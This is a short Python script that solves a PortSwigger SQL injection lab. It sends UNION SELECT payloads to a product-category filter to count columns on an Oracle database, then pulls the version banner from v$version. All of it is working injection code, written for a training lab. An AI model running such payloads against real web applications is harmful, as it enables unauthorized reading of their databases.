import requests as r
from time import sleep

# lab name: SQL injection attack, querying the database type and version on Oracle




link = "" # without the last backslash

vuln_path="/filter?category=Tech+gifts"



def found_column_oracle():
    col = 0
    payload = "\' union select "
    response = "Error"
    while "Error" in response:
        if col == 0:
            payload+="null "
        else:
            payload+=",null"

        col+=1
        full_link = link+vuln_path+payload+" from v$version --"
        my_request = r.get(full_link)
        response=my_request.text

    print("There is " ,  col," columns ")
    return col

#num_col = found_column_oracle() # there is 2 columns
# we can then enumerate the type of the 2 columns using : 

# ' union select 'a', null from v$version -- => ok
# ' union select null, 'a' from v$version -- => ok
# so the two columns can return string 


## ok once we figure out the number of columns let's use the cheasheet that portswigger gave us :
#https://portswigger.net/web-security/sql-injection/cheat-sheet
# there is a column name 'banner' in the v$version table

 
payload = "\' union select null,banner from v$version --"

full_link = link+vuln_path+payload

print(full_link)

my_request = r.get(full_link)

response = my_request.text